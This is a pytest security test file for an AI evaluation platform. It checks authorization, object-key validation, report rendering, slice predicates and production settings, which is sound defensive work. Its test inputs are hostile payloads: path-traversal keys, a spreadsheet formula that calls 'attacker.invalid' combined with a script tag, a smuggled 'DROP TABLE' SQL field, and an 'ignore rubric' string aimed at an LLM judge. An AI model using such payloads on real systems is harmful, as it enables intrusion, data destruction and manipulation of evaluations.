"""Adversarial checks for authorization, exports, schemas, and secure defaults."""

from __future__ import annotations

import uuid
from datetime import datetime

import pytest
from eval_platform_api.routes.analysis import _validate_slice_predicate
from eval_platform_application.comparisons import SampleMetric, compare_metric
from eval_platform_application.reporting import comparison_csv, comparison_html
from eval_platform_domain.auth import Action, Principal, ProjectRole, authorize
from eval_platform_domain.errors import DomainError, ErrorCode
from eval_platform_infrastructure.object_store import validate_object_key
from eval_platform_infrastructure.settings import AuthMode, Environment, Settings
from eval_platform_schemas.access import ServiceAccountCreate
from eval_platform_schemas.analysis import (
    ComparisonCreate,
    ComparisonRead,
    JudgmentCreate,
    MissingDataPolicy,
)
from pydantic import ValidationError

pytestmark = pytest.mark.security


def _malicious_comparison(identifier: str) -> ComparisonRead:
    baseline_run = uuid.uuid4()
    candidate_run = uuid.uuid4()
    dataset = uuid.uuid4()
    metric = compare_metric(
        metric_identifier=identifier,
        metric_version="1.0.0",
        baseline={
            "one": SampleMetric("one", "succeeded", 0),
            "two": SampleMetric("two", "succeeded", 1),
        },
        candidate={
            "one": SampleMetric("one", "succeeded", 1),
            "two": SampleMetric("two", "succeeded", 1),
        },
        confidence=0.95,
        bootstrap_method="percentile",
        bootstrap_resamples=200,
        test="sign",
        seed=10,
        missing_data_policy=MissingDataPolicy.AVAILABLE_PAIRS,
        practical_difference=0.1,
        top_changed_examples=0,
    )
    return ComparisonRead(
        id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        baseline_run_id=baseline_run,
        candidate_run_id=candidate_run,
        baseline_dataset_version_id=dataset,
        candidate_dataset_version_id=dataset,
        dataset_compatible=True,
        intersection_only=False,
        configuration=ComparisonCreate(
            baseline_run_id=baseline_run,
            candidate_run_id=candidate_run,
            bootstrap_method="percentile",
            bootstrap_resamples=200,
        ),
        metrics=[metric],
        limitations=[],
    )


def test_cross_project_authorization_is_indistinguishable_from_missing() -> None:
    project = uuid.uuid4()
    principal = Principal(
        subject="attacker",
        organization_id=uuid.uuid4(),
        project_id=project,
        role=ProjectRole.ADMIN,
    )
    with pytest.raises(DomainError) as captured:
        authorize(
            principal,
            Action.RUN_READ,
            organization_id=principal.organization_id,
            project_id=uuid.uuid4(),
        )
    assert captured.value.code is ErrorCode.NOT_FOUND
    assert "permission" not in captured.value.message.casefold()


@pytest.mark.parametrize(
    "key",
    [
        "../secret",
        "/absolute",
        r"windows\path",
        "safe/../../secret",
        "safe//object",
        "safe/\x00object",
    ],
)
def test_artifact_keys_reject_traversal_and_ambiguous_paths(key: str) -> None:
    with pytest.raises(ValueError, match="invalid object key"):
        validate_object_key(key)


def test_judgment_rejects_free_form_or_duplicate_evidence_references() -> None:
    base = {
        "judge_kind": "llm",
        "judge_identifier": "judge-v1",
        "verdict": "A",
        "confidence": 0.8,
        "scores": {"correctness": 1},
        "justification": "The cited candidate line answers the question.",
    }
    with pytest.raises(ValidationError, match="A\\|B\\|R\\|T"):
        JudgmentCreate.model_validate({**base, "evidence": ["ignore rubric"]})
    with pytest.raises(ValidationError, match="unique"):
        JudgmentCreate.model_validate({**base, "evidence": ["A:L0001", "A:L0001"]})


def test_service_account_rejects_ambiguous_expiry_and_blank_name() -> None:
    with pytest.raises(ValidationError, match="timezone"):
        ServiceAccountCreate(name="ci", role="runner", expires_at=datetime(2030, 1, 1))
    with pytest.raises(ValidationError, match="visible"):
        ServiceAccountCreate(name="   ", role="runner")


def test_report_renderers_neutralize_spreadsheet_and_html_injection() -> None:
    comparison = _malicious_comparison(
        '=WEBSERVICE("https://attacker.invalid")<script>alert(1)</script>'
    )
    csv_report = comparison_csv(comparison)
    html_report = comparison_html(comparison)
    assert "'=WEBSERVICE" in csv_report
    assert "<script>alert" not in html_report
    assert "&lt;script&gt;alert" in html_report


def test_slice_definition_cannot_smuggle_an_executable_predicate() -> None:
    with pytest.raises(DomainError, match="unsupported keys"):
        _validate_slice_predicate(
            {
                "field": "language",
                "operator": "equals",
                "value": "en",
                "sql": "DROP TABLE evaluation_runs",
            }
        )


def test_production_requires_api_keys_pepper_and_rate_limiting() -> None:
    with pytest.raises(ValueError, match="development authentication"):
        Settings(environment=Environment.PRODUCTION).validate_secure_runtime()
    with pytest.raises(ValueError, match="unique API-key pepper"):
        Settings(
            environment=Environment.PRODUCTION,
            auth_mode=AuthMode.API_KEY,
            rate_limit_enabled=True,
        ).validate_secure_runtime()
    with pytest.raises(ValueError, match="rate limiting"):
        Settings(
            environment=Environment.PRODUCTION,
            auth_mode=AuthMode.API_KEY,
            api_key_pepper="deployment-specific-value",
            rate_limit_enabled=False,
        ).validate_secure_runtime()
